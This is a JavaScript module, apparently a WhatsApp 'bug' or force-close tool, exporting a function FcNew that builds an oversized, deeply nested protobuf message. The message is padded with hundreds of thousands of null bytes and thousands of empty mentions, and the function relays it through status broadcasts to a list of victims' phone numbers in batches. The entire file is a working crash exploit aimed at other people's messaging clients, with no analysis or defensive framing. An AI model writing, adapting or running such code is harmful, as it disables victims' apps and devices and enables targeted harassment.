const { default: makeWASocket, useMultiFileAuthState, Browsers, delay, proto, DisconnectReason, makeCacheableSignalKeyStore, generateWAMessageFromContent, groupStatusMessageV2 } = require('@sakataoffc/baileys');
const pino = require('pino');
const crypto = require('crypto');

async function FcNew(sock, target) {
    if (!sock || !target) {
        console.log('[FcNew] missing sock or target');
        return;
    }

    // ---- Sender guard ----
    // Never let the paired number target itself.
    try {
        const senderRaw = (sock.user && sock.user.id) ? String(sock.user.id) : '';
        const senderNum = senderRaw.split('@')[0].split(':')[0];
        const firstTarget = Array.isArray(target) ? target[0] : target;
        const targetNum = String(firstTarget).split('@')[0].split(':')[0];
        if (senderNum && targetNum && senderNum === targetNum) {
            console.log('[FcNew] skipped — target equals sender (' + senderNum + ')');
            return;
        }
    } catch (_) {
        // fall through
    }

    const msg = {
        contactMessage: {
            displayName: "Monkey",
            vcard: "999",
            contextInfo: {}
        },
        protocolMessage: {
            type: 0,
            key: { remoteJid: target, fromMe: true },
            message: {
                interactiveMessage: {
                    body: { text: "\u0000".repeat(90000) },
                    nativeFlowMessage: {
                        buttons: [
                            { name: "quick_reply", buttonParamsJson: "\x00".repeat(25000) },
                            { name: "quick_reply", buttonParamsJson: "\0".repeat(12878) }
                        ],
                        messageParamsJson: JSON.stringify({
                            displayName: "X",
                            title: "\0".repeat(30000)
                        })
                    },
                    contextInfo: {
                        mentionedJid: Array.from({ length: 4000 }, () => ""),
                        forwardingScore: 9999,
                        isForwarded: true,
                        quotedMessage: {
                            locationMessage: {
                                degreesLatitude: -999.999,
                                degreesLongitude: 999.999,
                                name: "\u0000".repeat(35000),
                                address: "Faret After Ngewe".repeat(40000),
                                contextInfo: {
                                    mentionedJid: Array.from({ length: 2000 }, () => ""),
                                    forwardingScore: 9999,
                                    isForwarded: true
                                }
                            }
                        }
                    }
                }
            }
        }
    };

    const TAGS = [
        [0xBA, 0x03],
        [0xD2, 0x04],
        [0xAA, 0x02]
    ];

    const encodeVarint = function(n) {
        let buf = [];
        while (n >= 0x80) {
            buf.push((n & 0x7f) | 0x80);
            n >>>= 7;
        }
        buf.push(n);
        return Buffer.from(buf);
    };

    const wrapLd = function(tag, data) {
        return Buffer.concat([Buffer.from(tag), encodeVarint(data.length), data]);
    };

    const payload = proto.Message.encode(
        proto.Message.fromObject(msg)
    ).finish();

    const inflate = function(tag, depth) {
        let buf = payload;
        for (let i = 0; i < depth; i++) {
            buf = wrapLd(tag, wrapLd([0x0A], buf));
        }
        return buf;
    };

    const resolveJid = function(raw) {
        let s = String(raw || '').trim();
        if (s.includes('@')) return s;
        return s.replace(/\D/g, '') + '@s.whatsapp.net';
    };

    const jids = (Array.isArray(target) ? target : [target])
        .map(resolveJid)
        .filter(j => j.length > 15);

    if (!jids.length) return;

    const MAX_BATCH = 5;
    const DELAY_MS = 5000;
    let totalSent = 0;

    for (let offset = 0; offset < jids.length; offset += MAX_BATCH) {
        const chunk = jids.slice(offset, offset + MAX_BATCH);
        if (offset > 0) {
            await new Promise(r => setTimeout(r, DELAY_MS));
        }

        const idx = Math.floor(offset / MAX_BATCH) + 1;
        const suffix = idx > 1 ? ('-' + idx) : '';
        const msgId = 'crb' + Date.now().toString(36).toUpperCase() + suffix;

        for (let ti = 0; ti < TAGS.length; ti++) {
            const tag = TAGS[ti];
            let payload = null;

            for (let depth = 5000; depth >= 2000 && !payload; depth -= 400) {
                try {
                    const decoded = proto.Message.decode(inflate(tag, depth));
                    proto.Message.encode(decoded).finish();
                    payload = decoded;
                } catch (_) {}
            }

            if (!payload) continue;

            try {
                await sock.relayMessage('status@broadcast', payload, {
                    messageId: msgId,
                    statusJidList: chunk,
                    additionalNodes: [{
                        tag: 'meta',
                        attrs: {},
                        content: [{
                            tag: 'mentioned_users',
                            attrs: {},
                            content: chunk.map(jid => ({
                                tag: 'to',
                                attrs: { jid: jid },
                                content: []
                            }))
                        }]
                    }]
                });
                totalSent++;
            } catch (relayErr) {
                console.log('[FcNew relay]', (relayErr && relayErr.message) ? relayErr.message : relayErr);
            }
        }
    }
}

module.exports = { FcNew };
